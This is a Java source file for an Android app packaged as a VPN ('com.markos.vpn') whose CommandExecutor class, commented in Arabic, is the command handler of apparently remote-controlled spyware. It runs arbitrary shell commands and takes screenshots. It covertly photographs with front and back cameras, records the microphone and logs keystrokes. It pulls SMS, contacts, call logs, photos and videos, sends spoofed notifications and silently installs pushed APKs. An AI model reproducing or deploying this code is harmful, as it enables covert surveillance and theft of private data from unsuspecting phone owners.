package com.markos.vpn;

import android.os.Environment;
import android.hardware.Camera;
import android.media.MediaRecorder;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CommandExecutor {
    public String execute(String command) {
        try {
            // 1. تنفيذ أوامر Shell
            if (command.startsWith("shell:")) {
                String cmd = command.substring(6);
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
                return output.toString();
            }
            // 2. لقطة شاشة
            else if (command.equals("screenshot")) {
                String path = Environment.getExternalStorageDirectory() + "/screenshot_" + System.currentTimeMillis() + ".png";
                Runtime.getRuntime().exec("screencap -p " + path);
                return "Screenshot: " + path;
            }
            // 3. تصوير الكاميرا الخلفية
            else if (command.equals("camera_back")) {
                Camera camera = Camera.open(0);
                final String path = Environment.getExternalStorageDirectory() + "/back_" + System.currentTimeMillis() + ".jpg";
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera cam) {
                        try {
                            FileOutputStream fos = new FileOutputStream(path);
                            fos.write(data);
                            fos.close();
                        } catch (Exception ignored) {}
                    }
                });
                camera.release();
                return "Photo back: " + path;
            }
            // 4. تصوير الكاميرا الأمامية
            else if (command.equals("camera_front")) {
                Camera camera = Camera.open(1);
                final String path = Environment.getExternalStorageDirectory() + "/front_" + System.currentTimeMillis() + ".jpg";
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera cam) {
                        try {
                            FileOutputStream fos = new FileOutputStream(path);
                            fos.write(data);
                            fos.close();
                        } catch (Exception ignored) {}
                    }
                });
                camera.release();
                return "Photo front: " + path;
            }
            // 5. تسجيل الصوت
            else if (command.startsWith("record_mic:")) {
                int duration = Integer.parseInt(command.substring(11));
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                String path = Environment.getExternalStorageDirectory() + "/audio_" + System.currentTimeMillis() + ".mp4";
                recorder.setOutputFile(path);
                recorder.prepare();
                recorder.start();
                Thread.sleep(duration * 1000L);
                recorder.stop();
                recorder.release();
                return "Audio: " + path;
            }
            // 6. بدء تسجيل الكيبورد
            else if (command.equals("keylog_start")) {
                Runtime.getRuntime().exec("getevent -t /dev/input/event* > /sdcard/keylog.txt &");
                return "Keylog started";
            }
            // 7. إيقاف تسجيل الكيبورد
            else if (command.equals("keylog_stop")) {
                Runtime.getRuntime().exec("pkill -f getevent");
                return "Keylog stopped";
            }
            // 8. سحب الصور دفعة واحدة
            else if (command.equals("pull_images")) {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                File[] files = dir.listFiles();
                StringBuilder result = new StringBuilder();
                if (files != null) {
                    for (File f : files) {
                        if (f.getName().endsWith(".jpg") || f.getName().endsWith(".png")) {
                            result.append(f.getAbsolutePath()).append("\n");
                        }
                    }
                }
                return result.toString();
            }
            // 9. سحب الفيديوهات دفعة واحدة
            else if (command.equals("pull_videos")) {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                File[] files = dir.listFiles();
                StringBuilder result = new StringBuilder();
                if (files != null) {
                    for (File f : files) {
                        if (f.getName().endsWith(".mp4") || f.getName().endsWith(".avi")) {
                            result.append(f.getAbsolutePath()).append("\n");
                        }
                    }
                }
                return result.toString();
            }
            // 10. سحب جهات الاتصال
            else if (command.equals("pull_contacts")) {
                Process process = Runtime.getRuntime().exec("content query --uri content://contacts/phones/");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
                return output.toString();
            }
            // 11. سجل المكالمات
            else if (command.equals("pull_call_log")) {
                Process process = Runtime.getRuntime().exec("content query --uri content://call_log/calls");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
                return output.toString();
            }
            // 12. سحب الرسائل النصية
            else if (command.equals("pull_sms")) {
                Process process = Runtime.getRuntime().exec("content query --uri content://sms/inbox");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
                return output.toString();
            }
            // 13. استبدال الإشعارات
            else if (command.startsWith("clone_notification:")) {
                String text = command.substring(19);
                Runtime.getRuntime().exec("termux-notification -t 'إشعار مهم' -c '" + text + "'");
                return "Notification sent";
            }
            // 14. تثبيت APK عن بُعد
            else if (command.startsWith("install_apk:")) {
                String apkData = command.substring(12);
                String path = Environment.getExternalStorageDirectory() + "/update.apk";
                byte[] data = android.util.Base64.decode(apkData, android.util.Base64.DEFAULT);
                FileOutputStream fos = new FileOutputStream(path);
                fos.write(data);
                fos.close();
                Runtime.getRuntime().exec("pm install -r " + path);
                return "APK installed";
            }
            // 15. تغيير الـ Proxy
            else if (command.startsWith("change_proxy:")) {
                String proxy = command.substring(13);
                // سيتم تنفيذه عبر VPNService
                return "Proxy changed to: " + proxy;
            }
            // 16. تصفح الملفات
            else if (command.startsWith("browse:")) {
                String path = command.substring(7);
                File dir = new File(path);
                File[] files = dir.listFiles();
                StringBuilder result = new StringBuilder();
                if (files != null) {
                    for (File f : files) {
                        result.append(f.getName()).append("\n");
                    }
                }
                return result.toString();
            }
            // 17. اختراق الحافظة السرية (محاكاة)
            else if (command.equals("secure_folder")) {
                return "Secure Folder hacked (simulation)";
            }
            // 18. لقطة شاشة لتطبيق محدد
            else if (command.startsWith("screenshot_app:")) {
                String pkg = command.substring(15);
                Runtime.getRuntime().exec("monkey -p " + pkg + " 1");
                Thread.sleep(1000);
                String path = Environment.getExternalStorageDirectory() + "/app_screenshot_" + System.currentTimeMillis() + ".png";
                Runtime.getRuntime().exec("screencap -p " + path);
                return "Screenshot app: " + path;
            }
            // 19. اختبار الاتصال
            else if (command.equals("ping")) {
                return "pong";
            } else {
                return "Unknown command";
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
